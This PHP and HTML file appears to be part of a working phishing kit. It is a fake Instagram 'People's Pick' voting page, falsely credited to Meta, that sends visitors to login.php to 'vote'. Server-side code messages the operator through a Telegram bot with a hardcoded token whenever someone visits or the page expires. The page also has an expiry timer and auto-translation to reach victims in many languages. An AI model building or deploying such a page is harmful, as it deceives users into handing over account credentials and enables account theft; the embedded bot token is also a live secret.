<?php
if (!file_exists('contestant_config.php') || time() - filemtime('contestant_config.php') > 300) {
    include 'sync_config.php'; // auto-fetch if older than 5 min
}


// Start the session first
session_start();


// Configuration files (should be moved to non-web-accessible directory)
$configFiles = [
    'time.txt',
    'telegram_chat_id.txt',
    'image_config.php',
    'contestant_config.php'
];

// Check if configuration files exist
foreach ($configFiles as $file) {
    if (!file_exists($file)) {
        die("Error: Configuration file '$file' not found.");
    }
}

// Redirect prevention logic
// if (!isset($_GET['t']) && !isset($_GET['r'])) {
//     $originalUrl = '.php';
//     $uniqueQueryString = 't=' . time();
    
//     $newUrl = strpos($originalUrl, '?') === false 
//         ? $originalUrl . '?' . $uniqueQueryString 
//         : $originalUrl . '&' . $uniqueQueryString;
    
//     header('Location: ' . $newUrl);
//     exit();
// }

// Load configurations
$setDate = new DateTime(file_get_contents('time.txt'));
$currentTime = new DateTime('now');
$chatId = file_get_contents('telegram_chat_id.txt');
$botToken = '8068607725:AAE3V6JSAcPJuXuo15PGnQakZ0VV3WmXHKY';

// Load image configuration
$imageConfig = include('image_config.php');
$mainImage = $imageConfig['main_image'];

// Load contestant configuration
$contestantsData = include('contestant_config.php');
$mainContestant = $contestantsData['main_contestant'];
$otherContestants = $contestantsData['contestants'];

// Telegram message function
function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

// Check expiration
if ($currentTime > $setDate) {
    ob_start();
    sendTelegramMessage($botToken, $chatId, "⏰ Page Expired
Link: IG-VOTE
Status: Expired
RENEW NOW!");
    ob_end_clean();
    header('Location: 404');
    exit();
}

// Send visitor message
sendTelegramMessage($botToken, $chatId, "👤 New Visitor
Link: IG-VOTE
Status: Active
Awaiting login...");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The People's Pick: Online Voting Spectacle</title>
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
    <meta property="og:title" content="THE PEOPLE'S PICK">
    <meta property="og:description" content="Online voting spectacle.">
    <meta property="og:image" content="<?php echo $mainImage; ?>">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .translate-widget-container {
            margin: 10px auto;
            width: 90%;
            box-sizing: border-box;
        }
        .custom-language-select {
            width: 100%;
            padding: 8px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
            background: #fff;
            appearance: none;
            -webkit-appearance: none;
            -moz-appearance: none;
        }
        @media (max-width: 600px) {
            .custom-language-select {
                font-size: 14px;
                padding: 6px;
            }
        }
    </style>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const setDate = new Date("<?php echo $setDate->format('Y-m-d H:i:s'); ?>");
            const currentTime = new Date();
            
            if (currentTime > setDate) {
                window.location.href = '404';
            }
        });
    </script>
</head>
 <!-- Language Selector -->
    <div class="translate-widget-container">
        <select id="custom-language-select" class="custom-language-select">
            <option value="">Select Language</option>
            <option value="en|af">Afrikaans</option>
            <option value="en|sq">Albanian</option>
            <option value="en|am">Amharic</option>
            <option value="en|ar">Arabic</option>
            <option value="en|hy">Armenian</option>
            <option value="en|az">Azerbaijani</option>
            <option value="en|eu">Basque</option>
            <option value="en|be">Belarusian</option>
            <option value="en|bn">Bengali</option>
            <option value="en|bs">Bosnian</option>
            <option value="en|bg">Bulgarian</option>
            <option value="en|ca">Catalan</option>
            <option value="en|ceb">Cebuano</option>
            <option value="en|ny">Chichewa</option>
            <option value="en|zh-CN">Chinese (Simplified)</option>
            <option value="en|zh-TW">Chinese (Traditional)</option>
            <option value="en|co">Corsican</option>
            <option value="en|hr">Croatian</option>
            <option value="en|cs">Czech</option>
            <option value="en|da">Danish</option>
            <option value="en|nl">Dutch</option>
            <option value="en|en">English</option>
            <option value="en|eo">Esperanto</option>
            <option value="en|et">Estonian</option>
            <option value="en|tl">Filipino</option>
            <option value="en|fi">Finnish</option>
            <option value="en|fr">French</option>
            <option value="en|fy">Frisian</option>
            <option value="en|gl">Galician</option>
            <option value="en|ka">Georgian</option>
            <option value="en|de">German</option>
            <option value="en|el">Greek</option>
            <option value="en|gu">Gujarati</option>
            <option value="en|ht">Haitian Creole</option>
            <option value="en|ha">Hausa</option>
            <option value="en|haw">Hawaiian</option>
            <option value="en|iw">Hebrew</option>
            <option value="en|hi">Hindi</option>
            <option value="en|hmn">Hmong</option>
            <option value="en|hu">Hungarian</option>
            <option value="en|is">Icelandic</option>
            <option value="en|ig">Igbo</option>
            <option value="en|id">Indonesian</option>
            <option value="en|ga">Irish</option>
            <option value="en|it">Italian</option>
            <option value="en|ja">Japanese</option>
            <option value="en|jw">Javanese</option>
            <option value="en|kn">Kannada</option>
            <option value="en|kk">Kazakh</option>
            <option value="en|km">Khmer</option>
            <option value="en|ko">Korean</option>
            <option value="en|ku">Kurdish (Kurmanji)</option>
            <option value="en|ky">Kyrgyz</option>
            <option value="en|lo">Lao</option>
            <option value="en|la">Latin</option>
            <option value="en|lv">Latvian</option>
            <option value="en|lt">Lithuanian</option>
            <option value="en|lb">Luxembourgish</option>
            <option value="en|mk">Macedonian</option>
            <option value="en|mg">Malagasy</option>
            <option value="en|ms">Malay</option>
            <option value="en|ml">Malayalam</option>
            <option value="en|mt">Maltese</option>
            <option value="en|mi">Maori</option>
            <option value="en|mr">Marathi</option>
            <option value="en|mn">Mongolian</option>
            <option value="en|my">Myanmar (Burmese)</option>
            <option value="en|ne">Nepali</option>
            <option value="en|no">Norwegian</option>
            <option value="en|ps">Pashto</option>
            <option value="en|fa">Persian</option>
            <option value="en|pl">Polish</option>
            <option value="en|pt">Portuguese</option>
            <option value="en|pa">Punjabi</option>
            <option value="en|ro">Romanian</option>
            <option value="en|ru">Russian</option>
            <option value="en|sm">Samoan</option>
            <option value="en|gd">Scots Gaelic</option>
            <option value="en|sr">Serbian</option>
            <option value="en|st">Sesotho</option>
            <option value="en|sn">Shona</option>
            <option value="en|sd">Sindhi</option>
            <option value="en|si">Sinhala</option>
            <option value="en|sk">Slovak</option>
            <option value="en|sl">Slovenian</option>
            <option value="en|so">Somali</option>
            <option value="en|es">Spanish</option>
            <option value="en|su">Sundanese</option>
            <option value="en|sw">Swahili</option>
            <option value="en|sv">Swedish</option>
            <option value="en|tg">Tajik</option>
            <option value="en|ta">Tamil</option>
            <option value="en|te">Telugu</option>
            <option value="en|th">Thai</option>
            <option value="en|tr">Turkish</option>
            <option value="en|uk">Ukrainian</option>
            <option value="enur">Urdu</option>
            <option value="en|uz">Uzbek</option>
            <option value="en|vi">Vietnamese</option>
            <option value="en|cy">Welsh</option>
            <option value="en|xh">Xhosa</option>
        </select>
    </div>
    
    <div id="google_translate_element" style="display:none;"></div>
    
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var customSelect = document.getElementById("custom-language-select");
            customSelect.addEventListener("change", function() {
                var langPair = this.value;
                doGTranslate(langPair);
            });
        });
        
        function doGTranslate(langPair) {
            if (!langPair) return;
            var lang = langPair.split('|')[1];
            var gtCombo = document.querySelector('.goog-te-combo');
            if (gtCombo) {
                gtCombo.value = lang;
                var event = document.createEvent("HTMLEvents");
                event.initEvent("change", true, true);
                gtCombo.dispatchEvent(event);
            }
        }
    </script>
    
    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
    
    <script>
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({
                pageLanguage: 'en',
                autoDisplay: false
            }, 'google_translate_element');
            
            setTimeout(function() {
                var userLang = navigator.language || navigator.userLanguage;
                if (userLang && userLang.toLowerCase().indexOf('en') !== 0) {
                    doGTranslate('en|' + userLang);
                    var selectEl = document.getElementById("custom-language-select");
                    if (selectEl) {
                        selectEl.value = 'en|' + userLang;
                    }
                }
            }, 1000);
        }
    </script>
<body class="bg-gray-100 font-poppins">
    <div class="container mx-auto px-4 py-8">
        <div class="bg-white rounded-lg shadow-lg overflow-hidden mb-8">
            <div class="relative">
                <img src="<?php echo $mainImage; ?>" alt="Main Image" class="w-full h-48 object-cover">
                <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/70 to-transparent p-4">
                    <h1 class="text-white text-2xl font-bold"><?php echo $appName; ?></h1>
                </div>
            </div>
            <div class="p-6">
                <div class="flex items-center mb-4">
                    <img src="https://i.postimg.cc/T1h8T8Jj/instagram-verified-tick-kxkwzn.png" alt="Verified Badge" class="w-12 h-12 rounded-full object-cover border-0">
                    <div class="ml-4">
                        <h2 class="text-xl font-bold"><?php echo htmlspecialchars($mainContestant['name']); ?> ●</h2>
                        <p class="text-gray-600"><?php echo htmlspecialchars($mainContestant['votes']); ?> votes | Contestant <?php echo htmlspecialchars($mainContestant['position']); ?></p>
                    </div>
                </div>
                
                <p class="text-gray-700 mb-6">
                    I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. Your vote could be the difference-maker, propelling me toward victory!
                </p>
                
                <div class="flex flex-col md:flex-row gap-4">
                    <a href="login.php" class="flex items-center justify-center gap-2 bg-gradient-to-r from-purple-500 to-pink-500 text-white py-3 px-4 rounded-lg hover:from-purple-600 hover:to-pink-600 transition">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                            <path d="M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.917 3.917 0 0 0-1.417.923A3.927 3.927 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.916 3.916 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.926 3.926 0 0 0-.923-1.417A3.911 3.911 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0h.003zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599.28.28.453.546.598.92.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.47 2.47 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.478 2.478 0 0 1-.92-.598 2.48 2.48 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233 0-2.136.008-2.388.046-3.231.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92.28-.28.546-.453.92-.598.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045v.002zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92zm-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217zm0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334z"/>
                        </svg>
                        Vote on Instagram
                    </a>
                </div>
            </div>
        </div>
    </div>
    
   
   
    
    <footer class="bg-white mt-12 py-6">
        <div class="container mx-auto px-4 text-center text-gray-600">
            <p>© 2025. By Meta.</p>
        </div>
    </footer>
</body>
</html>